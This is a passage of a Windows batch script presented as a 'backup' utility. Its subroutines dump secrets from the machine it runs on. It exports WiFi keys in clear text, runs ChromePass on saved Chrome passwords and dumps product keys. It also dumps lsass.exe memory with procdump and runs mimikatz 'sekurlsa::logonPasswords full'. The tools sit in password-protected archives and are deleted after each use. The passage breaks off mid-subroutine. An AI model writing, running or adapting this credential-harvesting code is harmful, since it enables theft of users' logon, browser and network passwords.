"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_Windexe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=12288
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_Windzip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=5059
set VAR_DT_FILE_EXPECT_SHA1SUM=ef910c9b020ef3f36518819d65ec0d0bdd6becf7
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Sound_Play
set VAR_DT_SOUNDWAVFILE=
set VAR_DT_SOUNDWAVFILE=%1
set VAR_DT_SOUNDWAVFILE=%VAR_DT_SOUNDWAVFILE:"=%
set VAR_DT_SOUNDVBSFILE=
set VAR_DT_SOUNDVBSFILE=%2
set VAR_DT_SOUNDVBSFILE=%VAR_DT_SOUNDVBSFILE:"=%
if "%CON_DT_LOG%"=="TRUE" @echo Executing sound file "%VAR_DT_SOUNDWAVFILE%"... >> "%CON_DT_LOGFILE%"
@echo Set oVoice = CreateObject("SAPI.SpVoice")> "%VAR_DT_SOUNDVBSFILE%"
@echo. >> "%VAR_DT_SOUNDVBSFILE%"
@echo set oSpFileStream = CreateObject("SAPI.SpFileStream")>> "%VAR_DT_SOUNDVBSFILE%"
@echo. >> "%VAR_DT_SOUNDVBSFILE%"
@echo oSpFileStream.Open "%VAR_DT_SOUNDWAVFILE%" >> "%VAR_DT_SOUNDVBSFILE%"
@echo. >> "%VAR_DT_SOUNDVBSFILE%"
@echo oVoice.SpeakStream oSpFileStream>> "%VAR_DT_SOUNDVBSFILE%"
@echo. >> "%VAR_DT_SOUNDVBSFILE%"
@echo oSpFileStream.Close>> "%VAR_DT_SOUNDVBSFILE%"
if exist "%VAR_DT_SOUNDVBSFILE%" wscript "%VAR_DT_SOUNDVBSFILE%"
if "%CON_DT_LOG%"=="TRUE" @echo Execution of sound file "%VAR_DT_SOUNDWAVFILE%" complete. >> "%CON_DT_LOGFILE%"
set VAR_DT_SOUNDWAVFILE=
goto the_end_of_time
:DT_Verify_System
set DT_SYSTEM_TYPE=32BIT
set DT_SYSTEM_SYS_ROOT=System32
if exist "%SystemRoot%\SysWOW64" set DT_SYSTEM_TYPE=64BIT
if exist "%SystemRoot%\SysWOW64" set DT_SYSTEM_SYS_ROOT=SysWOW64
goto the_end_of_time
:DT_Backup_Product_Keys
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate the file "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip"... >> "%CON_DT_LOGFILE%"
)
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
if "%CON_DT_LOG%"=="TRUE" goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\Wind\" -y "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe"... >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" >> "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_FILE%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Execution of "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" complete. >> "%CON_DT_LOGFILE%"
)
if not exist "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_FILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%CON_DT_BACKUP_PRODUCT_KEYS_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_FILE%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe"
goto the_end_of_time
:DT_Backup_WiFi_Keys
if "%1"=="" goto the_end_of_time
if %1=="" goto the_end_of_time
set BackupWiFiKeysTo=%1
set BackupWiFiKeysTo=%BackupWiFiKeysTo:"=%
if "%CON_DT_LOG%"=="TRUE" @echo Backing up WiFi keys... >> "%CON_DT_LOGFILE%"
netsh wlan export profile key=clear folder="%BackupWiFiKeysTo%" >nul
if "%CON_DT_LOG%"=="TRUE" @echo WiFi Backup command executed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
:DT_Backup_Directory_Listings
if "%CON_DT_LOG%"=="TRUE" @echo Writing directory listings... >> "%CON_DT_LOGFILE%"
if exist "%USERPROFILE%\My Pictures" @echo Listing of "%USERPROFILE%\My Pictures": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Pictures" dir "%USERPROFILE%\My Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Pictures" @echo Listing of "%USERPROFILE%\Pictures": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Pictures" dir "%USERPROFILE%\Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Music" @echo Listing of "%USERPROFILE%\My Music": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Music" dir "%USERPROFILE%\My Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Music" @echo Listing of "%USERPROFILE%\Music": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Music" dir "%USERPROFILE%\Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Videos" @echo Listing of "%USERPROFILE%\My Videos": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Videos" dir "%USERPROFILE%\My Videos" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Videos" @echo Listing of "%USERPROFILE%\Videos": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Videos" dir "%USERPROFILE%\Videos" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Pictures" @echo Listing of "%USERPROFILE%\My Documents\My Pictures": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Pictures" dir "%USERPROFILE%\My Documents\My Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Pictures" @echo Listing of "%USERPROFILE%\My Documents\Pictures": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Pictures" dir "%USERPROFILE%\My Documents\Pictures" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Pictures_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Music" @echo Listing of "%USERPROFILE%\My Documents\My Music": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Music" dir "%USERPROFILE%\My Documents\My Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Music" @echo Listing of "%USERPROFILE%\My Documents\Music": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Music" dir "%USERPROFILE%\My Documents\Music" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Music_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Videos" @echo Listing of "%USERPROFILE%\My Documents\My Videos": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\My Videos" dir "%USERPROFILE%\My Documents\My Videos" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Videos" @echo Listing of "%USERPROFILE%\My Documents\Videos": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents\Videos" dir "%USERPROFILE%\My Documents\Videos" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Videos_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Documents" @echo Listing of "%USERPROFILE%\Documents": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Documents_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\Documents" dir "%USERPROFILE%\Documents" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Documents_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents" @echo Listing of "%USERPROFILE%\My Documents": >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Documents_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%USERPROFILE%\My Documents" dir "%USERPROFILE%\My Documents" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\My_Documents_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if not "%ProgramFiles%"=="%SystemDrive%\Program Files" (
if exist "%SystemDrive%\Program Files" dir "%SystemDrive%\Program Files" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Program_Files_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
if exist "%ProgramFiles%" dir "%ProgramFiles%" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Program_Files2_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
)
if "%ProgramFiles%"=="%SystemDrive%\Program Files" (
if exist "%ProgramFiles%" dir "%ProgramFiles%" >> "%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%\Program_Files_%CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE%"
)
if "%CON_DT_LOG%"=="TRUE" @echo Execution of directory listing complete. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
:DT_Backup_Chrome_Data
if "%1"=="" goto the_end_of_time
if %1=="" goto the_end_of_time
set DT_CHROMEPASSBACKUPFILE=%1
set DT_CHROMEPASSBACKUPFILE=%DT_CHROMEPASSBACKUPFILE:"=%
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate the file "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip"... >> "%CON_DT_LOGFILE%"
)
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\" -y "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe"... >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" (
"%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" /stext "%DT_CHROMEPASSBACKUPFILE%"
if "%CON_DT_LOG%"=="TRUE" @echo Execution of "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" complete. >> "%CON_DT_LOGFILE%"
)
if not exist "%DT_CHROMEPASSBACKUPFILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%DT_CHROMEPASSBACKUPFILE%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe"
goto the_end_of_time
:DT_Backup_Windows_Passwords
if "%1"=="" goto the_end_of_time
if %1=="" goto the_end_of_time
if "%2"=="" goto the_end_of_time
if %2=="" goto the_end_of_time
if "%3"=="" goto the_end_of_time
if %3=="" goto the_end_of_time
set DT_WINDOWS_PASSWORD_BACKUP_PATH=%1
set DT_WINDOWS_PASSWORD_BACKUP_PATH=%DT_WINDOWS_PASSWORD_BACKUP_PATH:"=%
set DT_WINDOWS_PASSWORD_BACKUP_FILE=%2
set DT_WINDOWS_PASSWORD_BACKUP_FILE=%DT_WINDOWS_PASSWORD_BACKUP_FILE:"=%
set DT_WINDOWS_PASSWORD_BACKUP_FILE_DMP=%3
set DT_WINDOWS_PASSWORD_BACKUP_FILE_DMP=%DT_WINDOWS_PASSWORD_BACKUP_FILE_DMP:"=%
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="0" call :DT_Backup_Windows_Passwords_Procdump
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="0" goto the_end_of_time
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="1" call :DT_Backup_Windows_Passwords_Mimikatz
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="1" goto the_end_of_time
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="2" call :DT_Backup_Windows_Passwords_Procdump
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="2" call :DT_Backup_Windows_Passwords_Mimikatz
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="3" call :DT_Backup_Windows_Passwords_PowerSploit_Mimikatz_RAM_Injection
goto the_end_of_time
:DT_Backup_Windows_Passwords_Procdump
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate the file "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip"... >> "%CON_DT_LOGFILE%"
)
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\Procdump\" -y "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe"... >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" (
"%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" -accepteula -ma lsass.exe "%DT_WINDOWS_PASSWORD_BACKUP_PATH%\%DT_WINDOWS_PASSWORD_BACKUP_FILE_DMP%" >nul
if "%CON_DT_LOG%"=="TRUE" @echo Execution of "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" complete. >> "%CON_DT_LOGFILE%"
)
if not exist "%DT_WINDOWS_PASSWORD_BACKUP_PATH%\%DT_WINDOWS_PASSWORD_BACKUP_FILE_DMP%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%DT_WINDOWS_PASSWORD_BACKUP_PATH%\%DT_WINDOWS_PASSWORD_BACKUP_FILE_DMP%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe"
goto the_end_of_time
:DT_Backup_Windows_Passwords_Mimikatz
if "%DT_SYSTEM_TYPE%"=="32BIT" goto DT_Backup_Windows_Passwords_Mimikatz_32BIT
if "%DT_SYSTEM_TYPE%"=="64BIT" goto DT_Backup_Windows_Passwords_Mimikatz_64BIT
goto the_end_of_time
:DT_Backup_Windows_Passwords_Mimikatz_32BIT
if "%CON_DT_LOG%"=="TRUE" @echo Preparing to execute Mimikatz 32BIT edition... >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip"! Mimikatz execution failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip"... >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\" -y "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"... >> "%CON_DT_LOGFILE%"
"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"
if not exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to write the file "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"! >> "%CON_DT_LOGFILE%"
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"
goto the_end_of_time
:DT_Backup_Windows_Passwords_Mimikatz_64BIT
if "%CON_DT_LOG%"=="TRUE" @echo Preparing to execute Mimikatz 64BIT edition... >> "%CON_DT_LOGFILE%"

if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip"! Mimikatz execution failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe"
if "%CON_DT_LOG%"=="TRUE" @echo Extracting "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip"... >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"! Extraction of data failed. >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\" -y "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" (
if "%CON_DT_LOG%"=="TRUE" @echo Failed to locate "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
)
if "%CON_DT_LOG%"=="TRUE" @echo Extraction of "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" successful. Executing "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe"... >> "%CON_DT_LOGFILE%"
